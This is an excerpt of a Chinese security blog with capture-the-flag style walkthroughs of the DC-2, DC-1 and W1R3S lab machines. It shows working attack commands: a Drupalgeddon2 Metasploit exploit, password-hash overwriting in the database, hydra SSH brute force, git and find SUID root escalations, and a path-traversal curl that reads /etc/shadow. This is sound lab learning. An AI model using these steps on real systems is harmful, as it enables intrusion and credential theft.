src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405092121947.png" alt="image-20240509212123905"></p><blockquote><p>&#x2F;usr&#x2F;bin&#x2F;gpasswd<br>&#x2F;usr&#x2F;bin&#x2F;newgrp<br>&#x2F;usr&#x2F;bin&#x2F;sudo<br>&#x2F;usr&#x2F;bin&#x2F;chfn<br>&#x2F;usr&#x2F;bin&#x2F;chsh<br>&#x2F;usr&#x2F;bin&#x2F;passwd<br>&#x2F;usr&#x2F;bin&#x2F;procmail<br>&#x2F;usr&#x2F;bin&#x2F;at<br>&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign<br>&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper<br>&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device<br>&#x2F;usr&#x2F;sbin&#x2F;exim4<br>&#x2F;bin&#x2F;umount<br>&#x2F;bin&#x2F;mount<br>&#x2F;bin&#x2F;su<br>You have mail in &#x2F;var&#x2F;mail&#x2F;tom</p></blockquote><p>发现并没有什么文件可以使用，参考别人的打靶文章，知道应该要换用户，在flag3的地方已经进行了提示</p><p>所以我们这里切换到jerry账号，查看sudo配置文件<code>sudo -l</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405092139015.png" alt="image-20240509213945977"></p><p>发现git命令是root权限的，刚才我们通过网页搜索的时候也看到过git命令提权的方法</p><blockquote><p>1、sudo git help config #在末行命令模式输入<br>!&#x2F;bin&#x2F;bash 或 !’sh’ #完成提权<br>2、sudo git -p help<br>!&#x2F;bin&#x2F;bash #输入!&#x2F;bin&#x2F;bash，即可打开一个用户为root的shell</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405092142894.png" alt="image-20240509214208855"></p><p>通过find命令运行最后一个flag</p><blockquote><p>find &#x2F; -name *flag*</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405092143591.png" alt="image-20240509214318544"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405092143269.png" alt="image-20240509214350229"></p><p>好了，那么dc-2也就到此结束咯</p><h1 id="10-总结"><a href="#10-总结" class="headerlink" title="10.总结"></a>10.总结</h1><p>在这个靶场学到的技能还是相当多的，以下是一部分</p><ol><li>ip地址重定向，可通过修改hosts文件绕过</li><li>cewl爬虫获取网页的密码字典</li><li>wordpress存在wpscan工具进行存活用户名扫描以及管理系统的账户密码爆破</li><li>compgen -c可以查看可执行命令</li><li>有一些已知的用户名和密码可以用来尝试连接ssh（如果服务开放的话）</li><li>可以通过一些已知的命令进行提权典型的命令有nmap、vim、find、bash、more、less、nano、cp、git、vi等等</li></ol>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>打靶日记</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dc-1打靶日记</title>
    <link href="/2024/05/08/dc-1%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/"/>
    <url>/2024/05/08/dc-1%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="1-nmap扫描"><a href="#1-nmap扫描" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h1><h2 id="1-1-目标ip地址确认"><a href="#1-1-目标ip地址确认" class="headerlink" title="1.1 目标ip地址确认"></a>1.1 目标ip地址确认</h2><p>通过开关靶机确定并查询当前网段存活的主机来确定靶机的ip地址</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081426649.png" alt="image-20240508142639621"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081427931.png" alt="image-20240508142749901"></p><p>通过比较可以看出我们的靶机的ip地址应该是<code>192.168.31.97</code></p><h2 id="1-2-端口扫描"><a href="#1-2-端口扫描" class="headerlink" title="1.2 端口扫描"></a>1.2 端口扫描</h2><ol><li>扫描开放端口</li></ol><blockquote><p>nmap -sT –min-rate 10000 -p- 192.168.31.97 -oA nmapscan&#x2F;dc-1ports</p></blockquote><p><code>-sT</code>: 使用tcp三次握手的过程进行探测端口是否开放（相对较慢，但相对准确）；</p><p><code>-sS</code>: 默认扫描方式，通过syn标志位进行检测连接是否开放（容易被防火墙挡住）；</p><p><code>-oA</code>：以全格式保存在后续的地址文件中，以三种不同的后缀文件名保存；</p><p><code>--min-rate</code>: 指定扫描的速度，在正式的护网中要比10000还慢；</p><p><code>-p</code>：指定扫描端口，<code>-p-</code>指的是从1到65535端口</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081430756.png" alt="image-20240508143039722"></p><p>可以看到其开放的端口有<code>22，80，111，34609</code></p><ol start="2"><li>扫描开放端口的详细信息</li></ol><blockquote><p>sudo nmap -sT -sV -sC -O -p22,80,111,34609 192.168.31.97 -oA nmapscan&#x2F;portsdetail</p></blockquote><p><code>-sV</code>：扫描提供服务的版本</p><p><code>-sC</code>：用默认的脚本进行扫描</p><p><code>-O</code>：扫描操作系统的版本</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081433489.png" alt="image-20240508143334438"></p><p>根据端口的扫描结果可以知道的信息并不太多，但是通过访问80端口暴露出来的目录可以得知，在<code>install.php</code>目录下，可以确定其使用的框架</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081442759.png" alt="image-20240508144253725"></p><p>通过网络查询可以知道这是一个CMS框架，作为重要信息之一。</p><p>通过漏洞搜索可知，这个cms框架的漏洞并不少</p><blockquote><p>searchsploit durpal cms</p><p>searchsploit durpal</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081450249.png" alt="image-20240508145010198"></p><ol start="3"><li>扫描常见udp端口</li></ol><blockquote><p>sudo nmap -sU –top-ports 20 192.168.31.97 -oA nmapscan&#x2F;udpports</p></blockquote><p><code>--top-ports</code>：扫描最常用的n个端口，空格接数量；</p><p>扫描最常见的20个udp端口，查看其开放状态；保存信息备用；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081444101.png" alt="image-20240508144444059"></p><ol start="4"><li>nmap漏扫</li></ol><blockquote><p>sudo nmap -script&#x3D;vuln -p22,80,111,34609 192.168.31.97 -oA nmapscan&#x2F;vuln</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081512570.png" alt="image-20240508151247542"></p><p>漏扫27分钟也没扫出啥，待会再扫，先试试drupal cms搜索出来的漏洞</p><h1 id="2-gobuster目录爆破"><a href="#2-gobuster目录爆破" class="headerlink" title="2. gobuster目录爆破"></a>2. gobuster目录爆破</h1><blockquote><p>sudo gobuster dir -u <a href="http://192.168.31.97/">http://192.168.31.97</a> –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081511966.png" alt="image-20240508151137916"></p><p>目录爆破太慢了，对已爆破出来的目录访问能得到的信息就是知道使用的是drupal cms</p><h1 id="3-drupal-CMS测试"><a href="#3-drupal-CMS测试" class="headerlink" title="3. drupal CMS测试"></a>3. drupal CMS测试</h1><p>使用Metasploit查询该CMS进行进行利用测试。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081524131.png" alt="image-20240508152402082"></p><p>可以根据自己的判断对上述的漏洞进行优先级排序测试，一般从排名<code>excellent</code>中最新的开始测试，我们这里先测试2018年的那个<code>exploit/unix/webapp/drupal_drupalgeddon2</code></p><blockquote><p>use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2</p><p>show options</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081529366.png" alt="image-20240508152900292"></p><p><code>show options</code>显示漏洞模块参数，<code>Required</code>是<code>yes</code>的则是必须设置的，为<code>no</code>的则是可设置可不设置的；</p><p><code>Current Setting</code>是当前设置的值</p><p>我们一般需要对<code>RHOSTS</code>进行设置，该值是指目标IP地址</p><blockquote><p>set RHOSTS 192.168.31.97</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081531152.png" alt="image-20240508153137069"></p><p>成功设置目标IP地址，在实施利用即可</p><blockquote><p>exploit</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081533460.png" alt="image-20240508153310426"></p><p>看到<code>Meterpreter session 1 opened (192.168.31.221:4444 -&gt; 192.168.31.97:39076) at 2024-05-08 15:32:19 +0800 </code>就是攻击成功了，接下来可以直接上shell获取权限</p><blockquote><p>shell</p><p>whoami</p><p>id</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081534848.png" alt="image-20240508153427769"></p><p>可以看到这只是一个普通权限的shell，虽然只是一个普通权限，但是我们可以通过该普通权限去获取别的信息</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081536091.png" alt="image-20240508153643060"></p><p>搜索其他的flag文件</p><blockquote><p>find &#x2F; -name flag*</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081540286.png" alt="image-20240508154021256"></p><p>通过网络查询得知drupal cms的配置文件一般位于名叫<code>setting.php</code>的文件当中，我们把所有的<code>*setting.php</code>文件都找出来</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081545632.png" alt="image-20240508154531599"></p><blockquote><p>find &#x2F; -name *settings.php</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081546462.png" alt="image-20240508154617431"></p><p>存在3个设置文件，第一个<code>theme-settings.php</code>根据名字判断应该是主题相关的设置文件，所以我们可以先不查看该文件，而先查看另外两个<code>settings.php</code>文件</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081548077.png" alt="image-20240508154818023"></p><p>可以看到<code>settings.php</code>文件中存在数据库的用户名和密码，以及flag2的提示信息；而第三个文件夹大多为注释内容，提取不到什么有用的信息。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081550013.png" alt="image-20240508155046925"></p><p>继续根据刚才获得的数据库用户名和密码登录数据库查看数据库中的数据，尝试获取登录的用户名和密码</p><blockquote><p>mysql -udbuser -pR0ck3t</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081557252.png" alt="image-20240508155737203"></p><p>可以看到已经成功登陆了数据库，查看数据库</p><blockquote><p>show databases;</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081558407.png" alt="image-20240508155828378"></p><p>可以看到一个是数据库名信息的记录文件，一个是drupaldb数据库；查看drupaldb数据库中的表名</p><blockquote><p>use drupaldb;show tables;</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081600607.png" alt="image-20240508160038573"></p><p>可以看到其中有个叫user的表，其中应该有我们想要的信息，查看该表内的内容；</p><blockquote><p>select * from users;</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081601292.png" alt="image-20240508160155232"></p><p>可以看到确实存在相应的用户名和密码，不过可惜的是用户名对应的密码存在加密,</p><blockquote><p>name  | pass                                                   </p><p>admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</p><p>Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ&#x2F;9TCGg</p></blockquote><p>通过经验判断，数据库中的密码一般是采用hash加密，我们寻找一下hash加密脚本</p><blockquote><p>find &#x2F; -name *hash*</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081613310.png" alt="image-20240508161302264"></p><p>通过名字判断这应该是我们需要的hash加密脚本，通过读取该脚本可以找到它的使用方法</p><blockquote><p>cat &#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081614931.png" alt="image-20240508161405902"></p><p>使用脚本将自己的密码进行hash加密，然后对表中账号的密码进行修改</p><blockquote><p>php &#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh admin</p><p>password: admin                 hash: $S$DdNJTCHNikFL2m5Yrdjd2mOZ8ZY47LZAsAQumOy5XNxo1My2AG6w</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081616040.png" alt="image-20240508161623002"></p><p>再次回到数据库中更新密码，修改admin账户的密码为admin</p><blockquote><p>mysql -udbuser -pR0ck3t</p><p>use drupaldb;update users set pass&#x3D;”$S$DdNJTCHNikFL2m5Yrdjd2mOZ8ZY47LZAsAQumOy5XNxo1My2AG6w” where name&#x3D;”admin” or name&#x3D;”Fred”;</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081622354.png" alt="image-20240508162245299"></p><p>使用已修改的账号密码去登录cms的后台管理，查看其内容可以发现flag3</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081633869.png" alt="image-20240508163330823"></p><p>通过访问<code>/etc/passwd</code>文件获取系统的用户名，想要访问<code>/etc/shadow</code>发现没有足够的权限，但是我们发现存在用户名为flag4</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081640654.png" alt="image-20240508164002611"></p><p>方法1：通过直接使用hydra爆破flag4的密码</p><p>方法2：提权获取root权限</p><p>首先，尝试通过爆破获取flag4用户民的密码</p><blockquote><p>hydra -l flag4 -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz ssh:&#x2F;&#x2F;192.168.31.97</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081651132.png" alt="image-20240508165141086"></p><p>成功爆破出flag4用户的ssh密码，使用其登录获取flag4.txt文件</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081652838.png" alt="image-20240508165242797"></p><p>提权获取root权限，利用find命令，找查具有SUID权限的可执行二进制文件</p><blockquote><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081649716.png" alt="image-20240508164924667"></p><p>find比较常用，可以执行root权限的命令找查文件</p><blockquote><p>find &#x2F; -name index.php -exec “&#x2F;bin&#x2F;sh” \;</p><p>找查什么文件不重要（但是是存在的文件），只需要格式对，然后后面加上</p><p>-exec “&#x2F;bin&#x2F;sh” \;</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081650903.png" alt="image-20240508165031862"></p><p>提权成功，已经获取了root权限，可以访问本机的所有文件，包括shadow</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405081653108.png" alt="image-20240508165317061"></p><p>至此完全结束！</p><h1 id="4-总结收获"><a href="#4-总结收获" class="headerlink" title="4. 总结收获"></a>4. 总结收获</h1><ol><li>扫描目标ip开放端口</li><li>扫描开放端口详细信息</li><li>爆破目录，查看目标机器使用的架构等等指纹信息，通过指纹信息查询是否存在相关的漏洞</li><li>通过基础漏洞获取普通shell，可以通过查询各种配置文件获取其他信息，包括数据库账户密码等或者通过提权获取爆破用户对应的密码等（重点步骤）</li><li>爆破ssh用户名密码</li></ol><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="1-Metasploit使用教程"><a href="#1-Metasploit使用教程" class="headerlink" title="*.1 Metasploit使用教程"></a>*.1 Metasploit使用教程</h2><ol><li>基本使用方法</li></ol><blockquote><p>msfconsole#进入框架</p><p>search  ms17_010# 使用search命令查找相关漏洞</p><p>use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue        # 使用use进入模块</p><p>info#使用info查看模块信息</p><p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp    #设置攻击载荷</p><p>show options#查看模块需要配置的参数</p><p>set RHOST 192.168.100.158#设置参数</p><p>exploit &#x2F; run#攻击后渗透阶段</p><p>后渗透阶段</p></blockquote><ol start="2"><li>生成交互性界面</li></ol><blockquote><p>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p></blockquote><h2 id="2-SUID提权"><a href="#2-SUID提权" class="headerlink" title="*.2 SUID提权"></a>*.2 SUID提权</h2><p><a href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权 - FreeBuf网络安全行业门户</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>打靶日记</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>W1R3S_1.0.1打靶日记</title>
    <link href="/2024/05/07/W1R3S-1-0-1%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/"/>
    <url>/2024/05/07/W1R3S-1-0-1%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="1-nmap扫描"><a href="#1-nmap扫描" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h1><h2 id="1-1-IP地址确定"><a href="#1-1-IP地址确定" class="headerlink" title="1.1 IP地址确定"></a>1.1 IP地址确定</h2><blockquote><p>sudo nmap -sn 192.168.31.0&#x2F;24&#x2F;&#x2F;-sn: Ping Scan - disable port scan<br>sudo arl-scan -l&#x2F;&#x2F;功能类似</p></blockquote><p>扫描当前网段存活的主机，指定一个C类地址进行扫描，扫描该地址段是否有主机存活；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071550966.png" alt="image-20240507155041932"></p><p>通过开关靶机再次对本机网段进行扫描可以确定靶机的ip地址，以下是打开靶机的ip地址查询；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071554574.png" alt="image-20240507155421958"></p><p>可以确定靶机的ip地址为<code>192.168.31.52</code></p><h2 id="1-2-端口扫描"><a href="#1-2-端口扫描" class="headerlink" title="1.2 端口扫描"></a>1.2 端口扫描</h2><blockquote><p>nmap -sT –min-rate 10000 -p- 192.168.31.52 -oA nmapscan&#x2F;w1r3sports</p></blockquote><p><code>-sT</code>: 使用tcp三次握手的过程进行探测端口是否开放（相对较慢，但相对准确）；</p><p><code>-sS</code>: 默认扫描方式，通过syn标志位进行检测连接是否开放（容易被防火墙挡住）；</p><p><code>-oA</code>：以全格式保存在后续的地址文件中，以三种不同的后缀文件名保存；</p><p><code>--min-rate</code>: 指定扫描的速度，在正式的护网中要比10000还慢；</p><p><code>-p</code>：指定扫描端口，<code>-p-</code>指的是从1到65535端口</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071603054.png" alt="image-20240507160325015"></p><blockquote><p>grep open w1r3sports.nmap | awk -F’&#x2F;‘ ‘{print $1}’ | paste -sd ‘,’</p></blockquote><p><code>-F&#39;/&#39;</code>:以’&#x2F;‘分隔提取字符串</p><p><code>$1</code>：是指分隔后的第一个变量</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071604049.png" alt="image-20240507160445016"></p><blockquote><p>sudo nmap -sT -sV -sC -O -p21,22,80,3306 192.168.31.52 -oA nmapscan&#x2F;portsdetail</p></blockquote><p><code>-sV</code>：扫描提供服务的版本</p><p><code>-sC</code>：用默认的脚本进行扫描</p><p><code>-O</code>：扫描操作系统的版本</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071612904.png" alt="image-20240507161230829"></p><p>优先级最高的端口是21和3306，观看是否能给我们提取到什么东西</p><p>然后再看端口80，兔子洞，重点检查</p><p>优先级最低的端口是22，一般情况下不可能是直接通过ssh登录</p><blockquote><p>sudo nmap -sU –top-ports 20 192.168.31.52 -oA nmapscan&#x2F;udpports</p></blockquote><p><code>--top-ports</code>：扫描最常用的n个端口，空格接数量；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071611484.png" alt="image-20240507161143441"></p><blockquote><p>sudo nmap -script&#x3D;vuln -p21,22,80,3306 192.168.31.52 -oA nmapscan&#x2F;vuln</p></blockquote><p>nmap的端口漏洞扫描</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071622560.png" alt="image-20240507162205500"></p><h2 id="1-3-ftp连接测试"><a href="#1-3-ftp连接测试" class="headerlink" title="1.3 ftp连接测试"></a>1.3 ftp连接测试</h2><blockquote><p>ftp 192.168.31.52</p><p>binary</p><p>ls</p><p>cd content</p><p>prompt</p><p>mget *.txt&#x2F;&#x2F;批量下载文件</p><p>get 01.txt&#x2F;&#x2F;单个文件下载</p></blockquote><p>ftp连接，通过使用<code>anonymous</code>匿名登录，密码为空，登录后切换二进制模式，否则可能下载下来的可执行文件是坏文件，无法使用</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071624510.png" alt="image-20240507162458445"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071626275.png" alt="image-20240507162623214"></p><p>查看下载文件的内容：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071624305.png" alt="image-20240507162435233"></p><p>可以看到有许多的加密代码，例如下方</p><blockquote><p>01ec2d8fc11c493b25029fb1f47f39ce</p><p>SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg&#x3D;&#x3D;</p><pre><code class="hljs"> ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡</code></pre><p>.punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ</p></blockquote><h1 id="2-hash-identifier工具"><a href="#2-hash-identifier工具" class="headerlink" title="2. hash-identifier工具"></a>2. hash-identifier工具</h1><p>帮助识别字符串是什么加密算法；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072010161.png" alt="image-20240507201022086"></p><p>可以看到相应的字符串应该是<code>md5</code>加密，通过MD5解密即可</p><h1 id="3-解密密文"><a href="#3-解密密文" class="headerlink" title="3. 解密密文"></a>3. 解密密文</h1><p>对于上述得出密文进行解密</p><blockquote><p>01ec2d8fc11c493b25029fb1f47f39ce</p><p>This is not a password</p></blockquote><p>通过hash-identifier可以知道这是md5加密，使用md5解密工具即可解密得出</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072016540.png" alt="image-20240507201644444"></p><blockquote><p>SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg&#x3D;&#x3D;</p><p><code>echo &quot;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==&quot; | base64 -d</code></p><p>在多接触加密密文后，可以感知这大概率是base64加密，经典的双等号结尾</p><p>It is easy, but not that easy..</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072018715.png" alt="image-20240507201851684"></p><p>直接使用echo命令即可解密</p><blockquote><p>​ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡</p><p>.punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ</p></blockquote><p>反转文本：<a href="https://www.upsidedowntext.com/">https://www.upsidedowntext.com/</a></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072025584.png" alt="image-20240507202506542"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072025028.png" alt="image-20240507202521988"></p><h1 id="4-3306端口sql测试"><a href="#4-3306端口sql测试" class="headerlink" title="4. 3306端口sql测试"></a>4. 3306端口sql测试</h1><blockquote><p>mysql -h 192.168.31.52 -u root -p</p></blockquote><p>测试是否存在相应的漏洞或是否能够获得什么其他的信息</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072029997.png" alt="image-20240507202934962"></p><h1 id="5-gobuster目录爆破"><a href="#5-gobuster目录爆破" class="headerlink" title="5. gobuster目录爆破"></a>5. gobuster目录爆破</h1><blockquote><p>sudo gobuster dir -u <a href="http://192.168.31.52/">http://192.168.31.52</a> –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072056973.png" alt="image-20240507205610907"></p><p>可以看出爆破除了的几个目录分别为</p><blockquote><p><code>http://192.168.31.52/wordpress</code></p><p><code>http://192.168.31.52/javascript</code></p><p><code>http://192.168.31.52/administrator</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072058559.png" alt="image-20240507205804520"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072058313.png" alt="image-20240507205814278"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072058501.png" alt="image-20240507205838447"></p><p>能够获得的信息是在网址<code>http://192.168.31.52/administrator</code>下看到的cuppa CMS框架</p><p>查询该CMS是否存在相应漏洞</p><p>第一个<code>http://192.168.31.52/wordpress</code>网址无法访问,即使通过修改host依旧无法访问,虽然无法完全排除漏洞,但是已经没有太多切入点了.</p><h1 id="6-漏洞搜索"><a href="#6-漏洞搜索" class="headerlink" title="6. 漏洞搜索"></a>6. 漏洞搜索</h1><blockquote><p>searchsploit cuppa cms</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072104075.png" alt="image-20240507210427028"></p><blockquote><p>searchsploit cuppa cms -m 25971</p></blockquote><h1 id="7-浏览器发送数据"><a href="#7-浏览器发送数据" class="headerlink" title="7. 浏览器发送数据"></a>7. 浏览器发送数据</h1><blockquote><p><a href="http://192.168.31.52/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.31.52/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072108051.png" alt="image-20240507210859003"></p><p>可能是post传输导致传输失败,通过网页搜索找到cms源码进行审计,发现确实是post传输导致数据传输失败</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072111899.png" alt="image-20240507211121754"></p><blockquote><p>将数据url编码以post方式传输</p><p>curl –data-urlencode ‘urlConfig&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd’ <a href="http://192.168.31.52/administrator/alerts/alertConfigField.php">http://192.168.31.52/administrator/alerts/alertConfigField.php</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072116718.png" alt="image-20240507211654580"></p><p>可以看到列出了<code>passwd</code>的内容,然后读出hash的<code>shadow</code>文件的内容</p><blockquote><p>&#x2F;etc&#x2F;<a href="https://so.csdn.net/so/search?q=shadow&spm=1001.2101.3001.7020">shadow</a> 文件，用于存储 Linux 系统中用户通过hash加密的密码信息，又称为“影子文件”。</p><p>由于&#x2F;etc&#x2F;passwd文件允许所有用户读取，易导致用户密码泄露，因此 Linux 系统将用户的密码信息从 &#x2F;etc&#x2F;passwd 文件中分离出来，并单独放到了此文件中。</p></blockquote><blockquote><p>curl –data-urlencode ‘urlConfig&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;shadow’ <a href="http://192.168.31.52/administrator/alerts/alertConfigField.php">http://192.168.31.52/administrator/alerts/alertConfigField.php</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072119239.png" alt="image-20240507211948113"></p><p>将该部分的内容复制保存下来,并将没有hash值得用户删除,得到</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072123728.png" alt="image-20240507212348687"></p><h1 id="8-hash爆破"><a href="#8-hash爆破" class="headerlink" title="8. hash爆破"></a>8. 